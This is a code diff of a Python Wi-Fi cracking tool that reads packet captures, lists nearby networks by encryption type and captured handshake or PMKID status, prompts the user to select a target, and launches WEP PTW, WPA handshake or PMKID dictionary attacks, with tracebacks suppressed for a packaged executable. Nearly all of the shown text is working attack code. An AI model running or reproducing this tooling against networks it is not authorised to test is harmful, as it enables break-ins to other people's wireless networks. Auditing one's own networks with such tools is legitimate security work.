@@ -14,11 +14,6 @@ import time
 from tqdm import tqdm
 import signal
 import sys
-import sys
-import argparse
-from scapy.all import *
-from scapy.layers.dot11 import Dot11, Dot11Elt, RadioTap
-from collections import defaultdict, Counter
 
 # --- BEGIN: Suppress Traceback/Exceptions for PyInstaller Executable ---
 def silent_excepthook(exc_type, exc_value, exc_traceback):
@@ -249,7 +244,7 @@ def docomputation(state, key, keylen, table, sh2, strongbytes, keylimit) -> int:
 def computekey(state, keybuf, keylen, testlimit) -> int:
     strongbytes = [0]*MAINKEYBYTES
     helper = []
-    for i in range(MAINKEYBYBYTES): helper.append(doublesorthelper())
+    for i in range(MAINKEYBYTES): helper.append(doublesorthelper())
     onestrong = (testlimit/10) * 2
     twostrong = (testlimit/10)
     simple = testlimit - onestrong - twostrong
@@ -647,12 +642,15 @@ def has_pmkid(packets):
 
 def detect_encryption_type(capture_file):
     packets = rdpcap(capture_file)
+    # Check for WEP
     for pkt in packets:
         if pkt.haslayer(Dot11):
             if hasattr(pkt, "wepdata"):
                 return "WEP"
+    # Check for WPA handshake
     if is_valid_handshake(packets):
         return "WPA"
+    # Check for PMKID
     if has_pmkid(packets):
         return "PMKID"
     return "UNKNOWN"
@@ -675,250 +673,205 @@ def password_worker(args):
         return password
     return None
 
-# --- ENUMERATE NETWORKS IF TWO OR MORE (INCLUDE FULL enum.py) ---
-def enumerate_networks_enum_py(capture_path):
-    WPA_SUITES = {
-        1: "WEP40",
-        2: "TKIP",
-        4: "CCMP",
-        5: "WEP104",
-        6: "BIP",
-        8: "GCMP",
-        9: "GCMP-256",
-        10: "CCMP-256"
-    }
-    AKM_SUITES = {
-        1: "WPA-PSK",
-        2: "WPA-802.1X",
-        3: "FT-PSK",
-        4: "FT-802.1X",
-        5: "WPA-PSK-SHA256",
-        6: "WPA-802.1X-SHA256",
-        7: "TDLS",
-        8: "SAE", # WPA3
-        9: "FT-SAE",
-        11: "WPA3-802.1X",
-        12: "WPA3-FT-802.1X",
-        13: "WPA3-PMK",
-        14: "WPA3-FT-PMK",
-        16: "OWE",
-        18: "DPP",
-    }
+# --- ENUM.PY INCLUDED BELOW, DO NOT IMPORT, CODE INLINED ---
+import sys as sys_enum
+import argparse as argparse_enum
+from scapy.all import *
+from scapy.layers.dot11 import Dot11, Dot11Elt, RadioTap
+from collections import defaultdict, Counter
+from termcolor import colored as colored_enum
 
-    def get_essid(pkt):
-        if not pkt.haslayer(Dot11Elt):
-            return ""
-        elt = pkt[Dot11Elt]
-        while isinstance(elt, Dot11Elt):
-            if elt.ID == 0:
-                try:
-                    return elt.info.decode(errors='ignore')
-                except:
-                    return ""
-            elt = elt.payload
+WPA_SUITES = {
+    1: "WEP40",
+    2: "TKIP",
+    4: "CCMP",
+    5: "WEP104",
+    6: "BIP",
+    8: "GCMP",
+    9: "GCMP-256",
+    10: "CCMP-256"
+}
+AKM_SUITES = {
+    1: "WPA-PSK",
+    2: "WPA-802.1X",
+    3: "FT-PSK",
+    4: "FT-802.1X",
+    5: "WPA-PSK-SHA256",
+    6: "WPA-802.1X-SHA256",
+    7: "TDLS",
+    8: "SAE", # WPA3
+    9: "FT-SAE",
+    11: "WPA3-802.1X",
+    12: "WPA3-FT-802.1X",
+    13: "WPA3-PMK",
+    14: "WPA3-FT-PMK",
+    16: "OWE",
+    18: "DPP",
+}
+
+def enum_get_essid(pkt):
+    if not pkt.haslayer(Dot11Elt):
         return ""
+    elt = pkt[Dot11Elt]
+    while isinstance(elt, Dot11Elt):
+        if elt.ID == 0:
+            try:
+                return elt.info.decode(errors='ignore')
+            except:
+                return ""
+        elt = elt.payload
+    return ""
 
-    def parse_rsn_info(rsn_bytes):
-        enc = set()
-        akms = set()
-        mgmt = set()
-        try:
-            version = int.from_bytes(rsn_bytes[0:2], "little")
-            group_cipher = rsn_bytes[2:6]
-            group_oui = group_cipher[:3]
-            group_suite = group_cipher[3]
-            enc.add(WPA_SUITES.get(group_suite, "Unknown"))
-            pcs_count = int.from_bytes(rsn_bytes[6:8], "little")
-            offset = 8
-            for _ in range(pcs_count):
-                pcs = rsn_bytes[offset:offset+4]
-                suite = pcs[3]
-                enc.add(WPA_SUITES.get(suite, "Unknown"))
-                offset += 4
-            akm_count = int.from_bytes(rsn_bytes[offset:offset+2], "little")
-            offset += 2
-            for _ in range(akm_count):
-                akm = rsn_bytes[offset:offset+4]
-                suite = akm[3]
-                akms.add(AKM_SUITES.get(suite, f"Unknown({suite})"))
-                offset += 4
-            offset += 2
-            if len(rsn_bytes) > offset:
-                pmkid_count = int.from_bytes(rsn_bytes[offset:offset+2], "little")
-                offset += 2 + pmkid_count*16
-            if len(rsn_bytes) >= offset+4:
-                mgmt_cipher = rsn_bytes[offset:offset+4]
-                mgmt_suite = mgmt_cipher[3]
-                mgmt.add(WPA_SUITES.get(mgmt_suite, "Unknown"))
-        except Exception:
-            pass
-        return enc, akms, mgmt
-
-    def parse_wpa_info(wpa_bytes):
-        return parse_rsn_info(wpa_bytes)
-
-    def get_encryption(pkt):
-        enc = set()
-        akms = set()
-        mgmt = set()
-        is_wep = False
-        is_wpa = False
-        is_wpa2 = False
-        is_wpa3 = False
-        is_owe = False
-        is_opn = False
-        info = []
-        if not pkt.haslayer(Dot11Elt):
-            return ("Unknown", "(Unknown)", "-")
-        capability = pkt.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}").split('+')
-        if 'privacy' in capability:
-            is_wep = True
-        elt = pkt[Dot11Elt]
-        while isinstance(elt, Dot11Elt):
-            if elt.ID == 48:
-                is_wpa2 = True
-                suites, akm, mgmt_cipher = parse_rsn_info(elt.info)
-                enc |= suites
-                akms |= akm
-                mgmt |= mgmt_cipher
-                if any("SAE" in a or "WPA3" in a for a in akm):
-                    is_wpa3 = True
-                if "OWE" in akm:
-                    is_owe = True
-            elif elt.ID == 221 and elt.info.startswith(b'\x00\x50\xf2\x01'):
-                is_wpa = True
-                suites, akm, mgmt_cipher = parse_wpa_info(elt.info[4:])
-                enc |= suites
-                akms |= akm
-            elt = elt.payload
-
-        if is_wpa3 or (akms and any("SAE" in a or "WPA3" in a for a in akms)):
-            encryption = "WPA3"
-        elif is_wpa2 and is_wpa:
-            encryption = "WPA/WPA2"
-        elif is_wpa2:
-            encryption = "WPA2"
-        elif is_wpa:
-            encryption = "WPA"
-        elif is_owe:
-            encryption = "OPN"
-        elif is_wep:
-            encryption = "WEP"
-        else:
-            encryption = "OPN"
-            is_opn = True
-
-        suite_str = ""
-        if enc or akms or mgmt:
-            suite_parts = []
-            if enc: suite_parts.append("/".join(sorted(enc)))
-            if akms: suite_parts.append("/".join(sorted(akms)))
-            if mgmt: suite_parts.append("MGT:" + "/".join(sorted(mgmt)))
-            suite_str = "(" + ", ".join(suite_parts) + ")"
-        else:
-            suite_str = "(None)"
-
-        return (encryption, suite_str, "-")
-
-    def get_bssid(pkt):
-        return pkt[Dot11].addr3 if pkt.haslayer(Dot11) else ""
-
-    def get_handshake_info(bssid, packets, iv_counter, handshakes, pmkids):
-        info = ""
-        if iv_counter.get(bssid, 0) > 5000:
-            info = "WEP Handshake"
-        elif bssid in handshakes:
-            info = "WPA Handshake"
-        elif bssid in pmkids:
-            info = "PMKID"
-        else:
-            info = "-"
-        return info
-
-    def detect_handshakes(packets):
-        handshakes = set()
-        pmkids = set()
-        iv_counter = Counter()
-        for pkt in packets:
-            if pkt.haslayer(Dot11):
-                if pkt.type == 2 and pkt.haslayer(Dot11WEP):
-                    bssid = pkt[Dot11].addr3
-                    iv = pkt.iv
-                    iv_counter[bssid] += 1
-                elif pkt.haslayer(EAPOL):
-                    bssid = pkt[Dot11].addr3
-                    handshakes.add(bssid)
-                elif pkt.haslayer(Dot11Elt):
-                    elt = pkt[Dot11Elt]
-                    while isinstance(elt, Dot11Elt):
-                        if elt.ID == 221 and elt.info.startswith(b'\x50\x6f\x9a\x0e'):
-                            bssid = pkt[Dot11].addr3
-                            pmkids.add(bssid)
-                        elt = elt.payload
-        return iv_counter, handshakes, pmkids
-
-    def colorize(text, enc_type):
-        color_map = {
-            "WEP": "red",
-            "WPA": "yellow",
-            "WPA2": "yellow",
-            "WPA3": "green",
-            "OPN": "cyan"
-        }
-        color = color_map.get(enc_type.split("/")[0], "white")
-        return colored(text, color, attrs=["bold"])
-
-    # Parse packets
+def enum_parse_rsn_info(rsn_bytes):
+    enc = set()
+    akms = set()
+    mgmt = set()
     try:
-        packets = rdpcap(capture_path)
-    except Exception as e:
-        print(f"Error loading capture file: {e}")
-        sys.exit(1)
+        version = int.from_bytes(rsn_bytes[0:2], "little")
+        group_cipher = rsn_bytes[2:6]
+        group_oui = group_cipher[:3]
+        group_suite = group_cipher[3]
+        enc.add(WPA_SUITES.get(group_suite, "Unknown"))
+        pcs_count = int.from_bytes(rsn_bytes[6:8], "little")
+        offset = 8
+        for _ in range(pcs_count):
+            pcs = rsn_bytes[offset:offset+4]
+            suite = pcs[3]
+            enc.add(WPA_SUITES.get(suite, "Unknown"))
+            offset += 4
+        akm_count = int.from_bytes(rsn_bytes[offset:offset+2], "little")
+        offset += 2
+        for _ in range(akm_count):
+            akm = rsn_bytes[offset:offset+4]
+            suite = akm[3]
+            akms.add(AKM_SUITES.get(suite, f"Unknown({suite})"))
+            offset += 4
+        offset += 2
+        if len(rsn_bytes) > offset:
+            pmkid_count = int.from_bytes(rsn_bytes[offset:offset+2], "little")
+            offset += 2 + pmkid_count*16
+        if len(rsn_bytes) >= offset+4:
+            mgmt_cipher = rsn_bytes[offset:offset+4]
+            mgmt_suite = mgmt_cipher[3]
+            mgmt.add(WPA_SUITES.get(mgmt_suite, "Unknown"))
+    except Exception:
+        pass
+    return enc, akms, mgmt
 
-    networks = {}
-    iv_counter, handshakes, pmkids = detect_handshakes(packets)
+def enum_parse_wpa_info(wpa_bytes):
+    return enum_parse_rsn_info(wpa_bytes)
 
-    for pkt in packets:
-        if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
-            bssid = get_bssid(pkt)
-            essid = get_essid(pkt)
-            enc_type, enc_detail, _ = get_encryption(pkt)
-            info = get_handshake_info(bssid, packets, iv_counter, handshakes, pmkids)
-            if bssid not in networks:
-                networks[bssid] = {
-                    "essid": essid,
-                    "encryption": enc_type,
-                    "encryption_detail": enc_detail,
-                    "info": info
-                }
+def enum_get_encryption(pkt):
+    enc = set()
+    akms = set()
+    mgmt = set()
+    is_wep = False
+    is_wpa = False
+    is_wpa2 = False
+    is_wpa3 = False
+    is_owe = False
+    is_opn = False
+    if not pkt.haslayer(Dot11Elt):
+        return ("Unknown", "(Unknown)", "-")
+    capability = pkt.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}").split('+')
+    if 'privacy' in capability:
+        is_wep = True
+    elt = pkt[Dot11Elt]
+    while isinstance(elt, Dot11Elt):
+        if elt.ID == 48:
+            is_wpa2 = True
+            suites, akm, mgmt_cipher = enum_parse_rsn_info(elt.info)
+            enc |= suites
+            akms |= akm
+            mgmt |= mgmt_cipher
+            if any("SAE" in a or "WPA3" in a for a in akm):
+                is_wpa3 = True
+            if "OWE" in akm:
+                is_owe = True
+        elif elt.ID == 221 and elt.info.startswith(b'\x00\x50\xf2\x01'):
+            is_wpa = True
+            suites, akm, mgmt_cipher = enum_parse_wpa_info(elt.info[4:])
+            enc |= suites
+            akms |= akm
+        elt = elt.payload
 
-    print(colored("SELECT A TARGET:", attrs=["bold"]))
-    print(colored("#   BSSID              ESSID                     Encryption         INFO", "white", attrs=["bold"]))
-    for idx, (bssid, data) in enumerate(networks.items(), 1):
-        essid = data["essid"] if data["essid"] else "<HIDDEN>"
-        enc = colorize(f"{data['encryption']:<7}", data['encryption'])
-        enc_detail = colorize(f"{data['encryption_detail']:<20}", data['encryption'])
-        info = colorize(f"{data['info']:<15}", data['encryption'])
-        print(f"{idx:<3} {bssid:<18} {essid:<25} {enc} {enc_detail} {info}")
-
-    if networks:
-        min_idx, max_idx = 1, len(networks)
-        sel = ""
-        while not (str(sel).isdigit() and min_idx <= int(sel) <= max_idx):
-            sel = input(f"Select network [{min_idx}-{max_idx}]: ").strip()
-        sel = int(sel)
-        bssid = list(networks.keys())[sel-1]
-        print(colored(f"Selected BSSID: {bssid} (ESSID: {networks[bssid]['essid']})", "green", attrs=["bold"]))
-        # WPA3 Detected logic for single WPA3, if only 1 WPA3 network
-        only_wpa3 = [net for net in networks.values() if net['encryption'] == 'WPA3']
-        if len(networks) == 1 and only_wpa3:
-            print(colored("WPA3 Detected! I dont support yet!", "red", attrs=["reverse", "bold"]))
-            sys.exit(0)
+    if is_wpa3 or (akms and any("SAE" in a or "WPA3" in a for a in akms)):
+        encryption = "WPA3"
+    elif is_wpa2 and is_wpa:
+        encryption = "WPA/WPA2"
+    elif is_wpa2:
+        encryption = "WPA2"
+    elif is_wpa:
+        encryption = "WPA"
+    elif is_owe:
+        encryption = "OPN"
+    elif is_wep:
+        encryption = "WEP"
     else:
-        print("No networks found.")
+        encryption = "OPN"
+        is_opn = True
 
-    return networks
-    # END FULL CODE FROM enum.py
+    suite_str = ""
+    if enc or akms or mgmt:
+        suite_parts = []
+        if enc: suite_parts.append("/".join(sorted(enc)))
+        if akms: suite_parts.append("/".join(sorted(akms)))
+        if mgmt: suite_parts.append("MGT:" + "/".join(sorted(mgmt)))
+        suite_str = "(" + ", ".join(suite_parts) + ")"
+    else:
+        suite_str = "(None)"
+
+    return (encryption, suite_str, "-")
+
+def enum_get_bssid(pkt):
+    return pkt[Dot11].addr3 if pkt.haslayer(Dot11) else ""
+
+def enum_get_handshake_info(bssid, packets, iv_counter, handshakes, pmkids):
+    info = ""
+    if iv_counter.get(bssid, 0) > 5000:
+        info = "WEP Handshake"
+    elif bssid in handshakes:
+        info = "Handshake"
+    elif bssid in pmkids:
+        info = "PMKID"
+    else:
+        info = "No Handshake"
+    return info
+
+def enum_detect_handshakes(packets):
+    handshakes = set()
+    pmkids = set()
+    iv_counter = Counter()
+    for pkt in packets:
+        if pkt.haslayer(Dot11):
+            if pkt.type == 2 and pkt.haslayer(Dot11WEP):
+                bssid = pkt[Dot11].addr3
+                iv = pkt.iv
+                iv_counter[bssid] += 1
+            elif pkt.haslayer(EAPOL):
+                bssid = pkt[Dot11].addr3
+                handshakes.add(bssid)
+            elif pkt.haslayer(Dot11Elt):
+                elt = pkt[Dot11Elt]
+                while isinstance(elt, Dot11Elt):
+                    if elt.ID == 221 and elt.info.startswith(b'\x50\x6f\x9a\x0e'):
+                        bssid = pkt[Dot11].addr3
+                        pmkids.add(bssid)
+                    elt = elt.payload
+    return iv_counter, handshakes, pmkids
+
+def enum_colorize(text, enc_type):
+    color_map = {
+        "WEP": "red",
+        "WPA": "yellow",
+        "WPA2": "yellow",
+        "WPA3": "green",
+        "OPN": "cyan"
+    }
+    color = color_map.get(enc_type.split("/")[0], "white")
+    return colored_enum(text, color, attrs=["bold"])
+
+# --- END ENUM CODE ---
 
 def main():
     print_banner()
@@ -928,139 +881,103 @@ def main():
     parser.add_argument("-r", "--pmk-db", help="SQLite PMK database (airvault.db format)", default=None)
     args = parser.parse_args()
 
-    # --- ENUMERATE NETWORKS IF TWO OR MORE ---
-    packets = rdpcap(args.capture)
-    # Find how many networks are in the capture
-    networks = {}
+    capfile = args.capture
+    try:
+        packets = rdpcap(capfile)
+    except Exception as e:
+        print(colored(f"Error reading PCAP file: {e}", "red"))
+        return
+
+    # ENUMERATE NETWORKS IF MORE THAN 1
+    bssids = {}
+    iv_counter, handshakes, pmkids = enum_detect_handshakes(packets)
     for pkt in packets:
         if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
-            bssid = pkt[Dot11].addr3 if pkt.haslayer(Dot11) else ""
-            if bssid and bssid not in networks:
-                networks[bssid] = pkt
-    if len(networks) >= 2:
-        enumerate_networks_enum_py(args.capture)
-        return  # Do NOT proceed further if user hasn't selected, or just enumerate and exit
+            bssid = enum_get_bssid(pkt)
+            essid = enum_get_essid(pkt)
+            enc_type, enc_detail, _ = enum_get_encryption(pkt)
+            info = enum_get_handshake_info(bssid, packets, iv_counter, handshakes, pmkids)
+            if bssid not in bssids:
+                bssids[bssid] = {
+                    "essid": essid,
+                    "encryption": enc_type,
+                    "encryption_detail": enc_detail,
+                    "info": info
+                }
+    networks = bssids
 
-    # If only 1 network, do WPA3 check (for single WPA3)
+    # WPA3 Detection if only 1 network
     if len(networks) == 1:
-        pkt = list(networks.values())[0]
-        # quick WPA3 check
-        def _get_encryption(pkt):
-            # Copy/paste from enum.py
-            WPA_SUITES = {
-                1: "WEP40",
-                2: "TKIP",
-                4: "CCMP",
-                5: "WEP104",
-                6: "BIP",
-                8: "GCMP",
-                9: "GCMP-256",
-                10: "CCMP-256"
-            }
-            AKM_SUITES = {
-                1: "WPA-PSK",
-                2: "WPA-802.1X",
-                3: "FT-PSK",
-                4: "FT-802.1X",
-                5: "WPA-PSK-SHA256",
-                6: "WPA-802.1X-SHA256",
-                7: "TDLS",
-                8: "SAE", # WPA3
-                9: "FT-SAE",
-                11: "WPA3-802.1X",
-                12: "WPA3-FT-802.1X",
-                13: "WPA3-PMK",
-                14: "WPA3-FT-PMK",
-                16: "OWE",
-                18: "DPP",
-            }
-            enc = set()
-            akms = set()
-            mgmt = set()
-            is_wep = False
-            is_wpa = False
-            is_wpa2 = False
-            is_wpa3 = False
-            is_owe = False
-            is_opn = False
-            info = []
-            if not pkt.haslayer(Dot11Elt):
-                return ("Unknown", "(Unknown)", "-")
-            capability = pkt.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}").split('+')
-            if 'privacy' in capability:
-                is_wep = True
-            elt = pkt[Dot11Elt]
-            while isinstance(elt, Dot11Elt):
-                if elt.ID == 48:
-                    is_wpa2 = True
-                    rsn_bytes = elt.info
-                    try:
-                        version = int.from_bytes(rsn_bytes[0:2], "little")
-                        group_cipher = rsn_bytes[2:6]
-                        group_oui = group_cipher[:3]
-                        group_suite = group_cipher[3]
-                        enc.add(WPA_SUITES.get(group_suite, "Unknown"))
-                        pcs_count = int.from_bytes(rsn_bytes[6:8], "little")
-                        offset = 8
-                        for _ in range(pcs_count):
-                            pcs = rsn_bytes[offset:offset+4]
-                            suite = pcs[3]
-                            enc.add(WPA_SUITES.get(suite, "Unknown"))
-                            offset += 4
-                        akm_count = int.from_bytes(rsn_bytes[offset:offset+2], "little")
-                        offset += 2
-                        for _ in range(akm_count):
-                            akm = rsn_bytes[offset:offset+4]
-                            suite = akm[3]
-                            akms.add(AKM_SUITES.get(suite, f"Unknown({suite})"))
-                            offset += 4
-                        offset += 2
-                        if len(rsn_bytes) > offset:
-                            pmkid_count = int.from_bytes(rsn_bytes[offset:offset+2], "little")
-                            offset += 2 + pmkid_count*16
-                        if len(rsn_bytes) >= offset+4:
-                            mgmt_cipher = rsn_bytes[offset:offset+4]
-                            mgmt_suite = mgmt_cipher[3]
-                            mgmt.add(WPA_SUITES.get(mgmt_suite, "Unknown"))
-                    except Exception:
-                        pass
-                    if any("SAE" in a or "WPA3" in a for a in akms):
-                        is_wpa3 = True
-                    if "OWE" in akms:
-                        is_owe = True
-                elif elt.ID == 221 and elt.info.startswith(b'\x00\x50\xf2\x01'):
-                    is_wpa = True
-                    # skip for WPA3
-                elt = elt.payload
+        net = list(networks.values())[0]
+        if net["encryption"] == "WPA3":
+            print("WPA3 Detected! I dont support yet!")
+            return
+        # If not WPA3, fall through to normal attack logic below
 
-            if is_wpa3 or (akms and any("SAE" in a or "WPA3" in a for a in akms)):
-                encryption = "WPA3"
-            elif is_wpa2 and is_wpa:
-                encryption = "WPA/WPA2"
-            elif is_wpa2:
-                encryption = "WPA2"
-            elif is_wpa:
-                encryption = "WPA"
-            elif is_owe:
-                encryption = "OPN"
-            elif is_wep:
-                encryption = "WEP"
-            else:
-                encryption = "OPN"
-                is_opn = True
-            return (encryption, "", "-")
-        enc, _, _ = _get_encryption(pkt)
-        if enc == "WPA3":
-            print(colored("WPA3 Detected! I dont support yet!", "red", attrs=["reverse", "bold"]))
+    # If more than 1 network, run the enum selection UI
+    if len(networks) > 1:
+        print(colored("SELECT A TARGET:", attrs=["bold"]))
+        print(colored("#   BSSID              ESSID                     Encryption         INFO", "white", attrs=["bold"]))
+        indexed = []
+        for idx, (bssid, data) in enumerate(networks.items(), 1):
+            essid = data["essid"] if data["essid"] else "<HIDDEN>"
+            enc = enum_colorize(f"{data['encryption']:<7}", data['encryption'])
+            enc_detail = enum_colorize(f"{data['encryption_detail']:<20}", data['encryption'])
+            info = enum_colorize(f"{data['info']:<15}", data['encryption'])
+            indexed.append((bssid, data))
+            print(f"{idx:<3} {bssid:<18} {essid:<25} {enc} {enc_detail} {info}")
+
+        # Only prompt if there is at least one handshake candidate/attackable network
+        valid_options = [
+            i+1 for i, (bssid, data) in enumerate(indexed)
+            if data["info"] in ("Handshake", "WEP Handshake", "PMKID")
+        ]
+        if not valid_options:
+            print("No Handshake or WEP crackable network or PMKID found!")
             return
 
-    encryption_type = detect_encryption_type(args.capture)
+        min_idx, max_idx = 1, len(indexed)
+        sel = ""
+        while not (str(sel).isdigit() and min_idx <= int(sel) <= max_idx and indexed[int(sel)-1][1]["info"] in ("Handshake", "WEP Handshake", "PMKID")):
+            sel = input(f"Select network [{min_idx}-{max_idx}]: ").strip()
+        sel = int(sel)
+        bssid = indexed[sel-1][0]
+        print(colored(f"Selected BSSID: {bssid} (ESSID: {networks[bssid]['essid']})", "green", attrs=["bold"]))
+
+        # Filter packets to only attack the selected BSSID
+        packets = [pkt for pkt in packets if (pkt.haslayer(Dot11) and pkt[Dot11].addr3 == bssid)]
+        # If the user selected a WPA3 network, quit
+        if networks[bssid]["encryption"] == "WPA3":
+            print("WPA3 Detected! I dont support yet!")
+            return
+    elif len(networks) == 0:
+        print("No Handshake or WEP crackable network or PMKID found!")
+        return
+
+    # Now, continue with normal amx.py logic
+    # Re-run detection on filtered packets for single-network case
+    encryption_type = None
+    # WEP check
+    for pkt in packets:
+        if pkt.haslayer(Dot11):
+            if hasattr(pkt, "wepdata"):
+                encryption_type = "WEP"
+                break
+    # WPA Handshake
+    if not encryption_type and is_valid_handshake(packets):
+        encryption_type = "WPA"
+    # PMKID
+    if not encryption_type and has_pmkid(packets):
+        encryption_type = "PMKID"
+    if not encryption_type:
+        encryption_type = "UNKNOWN"
+
     print(colored(f"[*] Detected Encryption: {encryption_type}", "magenta", attrs=["bold"]))
 
     if encryption_type == "WEP":
         print(colored("[*] Starting PTW WEP attack...", "yellow"))
         try:
-            pcap = rdpcap(args.capture)
+            pcap = packets
         except Exception as e:
             print(colored(f"Error reading PCAP file: {e}", "red"))
             return
@@ -1109,13 +1026,11 @@ def main():
         if not args.wordlist:
             print(colored("[-] Wordlist (-P) is required for WPA2-PMKID attack.", "red"))
             return
-        ssid = None
-        packets = rdpcap(args.capture)
         ssid = get_ssid(packets)
         if not ssid:
             print(colored("[-] SSID is required for WPA2-PMKID attack when not found in capture.", "red"))
             return
-        pmkid_list = extract_pmkid(args.capture)
+        pmkid_list = extract_pmkid(capfile)
         if not pmkid_list:
             print("No PMKID could be extracted. Exiting...")
             return
@@ -1145,11 +1060,10 @@ def main():
             progress.close()
             print(f'[+] Finished in {round(finish-start, 2)} second(s)')
     elif encryption_type == "WPA":
-        params = extract_handshake_info(args.capture)
+        params = extract_handshake_info(capfile)
         enc_type = identify_encryption_type(params)
         print(colored(f"\nIdentified Encryption Type: {enc_type}", "magenta", attrs=["bold"]))
 
-        # --- Multiprocessing WPA/WPA2 cracking ---
         wordlist_passwords = []
         db_passwords = []
         found = False
@@ -1167,14 +1081,11 @@ def main():
         password_candidates = []
         if wordlist_passwords:
             password_candidates.extend(wordlist_passwords)
-        # If no wordlist, but DB passwords exist, use those:
         if not wordlist_passwords and db_passwords:
             password_candidates.extend(db_passwords)
-        # If both given, prefer wordlist order but dedupe
         if wordlist_passwords and db_passwords:
             password_candidates.extend([pw for pw in db_passwords if pw not in wordlist_passwords])
 
-        # Multiprocessing Pool
         manager = multiprocessing.Manager()
         found_flag = manager.Value('b', False)
         cpu_count = multiprocessing.cpu_count()
